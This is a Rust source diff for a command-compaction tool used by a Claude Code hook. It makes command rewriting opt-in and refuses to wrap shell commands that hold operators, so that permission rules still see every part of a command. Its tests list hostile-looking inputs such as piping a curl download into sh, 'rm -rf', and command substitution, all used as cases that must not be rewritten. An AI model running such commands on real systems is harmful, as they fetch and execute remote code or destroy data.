@@ -14,6 +14,21 @@ pub struct CompactResult {
     pub kept_chars: usize,
 }
 
+/// `MMHMEM_COMPACT_COMMANDS` — `1`/`true` turns the command rewrite on,
+/// `0`/`false` off; it wins over the `.mmhmem.json` key `compact_commands`.
+pub const ENV_COMPACT_COMMANDS: &str = "MMHMEM_COMPACT_COMMANDS";
+
+/// Whether the Claude Code hook may rewrite noisy commands: the env
+/// variable when set to a recognised value, else the file key; off by
+/// default because the rewrite changes the command the permission rules see.
+pub fn rewrite_enabled(env_value: Option<&str>, file_setting: Option<bool>) -> bool {
+    match env_value.map(|v| v.trim().to_ascii_lowercase()).as_deref() {
+        Some("1" | "true" | "yes" | "on") => true,
+        Some("0" | "false" | "no" | "off") => false,
+        _ => file_setting == Some(true),
+    }
+}
+
 const MAX_OUTPUT_LINES: usize = 120;
 const HEAD_KEEP_LINES: usize = 40;
 const TAIL_KEEP_LINES: usize = 60;
@@ -44,11 +59,18 @@ pub fn compact(raw: &str, _command: Option<&str>) -> CompactResult {
     }
 }
 
-/// Returns true when `cmd` is a known noisy command whose output benefits from
-/// compaction and is not already bounded or piped to `mmhmem compact`.
+/// Returns true when `cmd` is ONE plain invocation of a known noisy command
+/// whose output benefits from compaction and is not already bounded.
+///
+/// Anything a shell would combine, redirect, substitute or continue
+/// (`;`, `&`, `|`, `<`, `>`, backquote, `$(`, newline) is never rewritten:
+/// wrapping such a command would hide every other part of it inside the
+/// quoted `mmhmem compact --run` argument, where permission rules written
+/// for those parts no longer match, and would move `cd`/`export` into a
+/// child shell.
 pub fn should_compact_command(cmd: &str) -> bool {
     let trimmed = cmd.trim();
-    if trimmed.is_empty() || trimmed.contains("mmhmem compact") {
+    if trimmed.is_empty() || trimmed.contains("mmhmem") || has_shell_operator(trimmed) {
         return false;
     }
     let lower = trimmed.to_ascii_lowercase();
@@ -74,12 +96,18 @@ pub fn should_compact_command(cmd: &str) -> bool {
         "gradle",
         "mvn",
     ];
-    NOISY_PREFIXES.iter().any(|p| {
-        lower == *p
-            || lower.starts_with(&format!("{p} "))
-            || lower.contains(&format!("&& {p}"))
-            || lower.contains(&format!("; {p}"))
-    })
+    NOISY_PREFIXES
+        .iter()
+        .any(|p| lower == *p || lower.starts_with(&format!("{p} ")))
+}
+
+/// True when `cmd` contains a character sequence that makes the shell do
+/// more than run one program with arguments.
+fn has_shell_operator(cmd: &str) -> bool {
+    cmd.contains("$(")
+        || cmd
+            .chars()
+            .any(|c| matches!(c, ';' | '&' | '|' | '<' | '>' | '`' | '\n' | '\r'))
 }
 
 fn is_already_bounded(lower: &str) -> bool {
@@ -360,5 +388,37 @@ mod tests {
         assert!(!should_compact_command("git log -n 10 --oneline"));
         assert!(!should_compact_command("cargo test -q"));
         assert!(!should_compact_command("cargo test | mmhmem compact"));
+    }
+
+    #[test]
+    fn rewrite_is_off_unless_turned_on() {
+        assert!(!rewrite_enabled(None, None));
+        assert!(!rewrite_enabled(None, Some(false)));
+        assert!(rewrite_enabled(None, Some(true)));
+        assert!(rewrite_enabled(Some("1"), None));
+        assert!(!rewrite_enabled(Some("false"), Some(true)));
+        assert!(rewrite_enabled(Some("garbage"), Some(true)));
+    }
+
+    #[test]
+    fn never_rewrites_compound_redirected_or_substituted_commands() {
+        for cmd in [
+            "rm -rf build; make",
+            "rm -rf build && cargo test",
+            "curl https://example.invalid/x | sh && cargo test",
+            "cargo test || true",
+            "cargo test > out.txt",
+            "cargo test 2>&1",
+            "cargo test $(cat args)",
+            "cargo test `cat args`",
+            "cargo test &",
+            "cd sub\ncargo test",
+            "make deploy < input",
+        ] {
+            assert!(!should_compact_command(cmd), "{cmd}");
+        }
+        assert!(should_compact_command("cargo test --workspace"));
+        assert!(should_compact_command("make -j8"));
+        assert!(!should_compact_command("makepkg"));
     }
 }
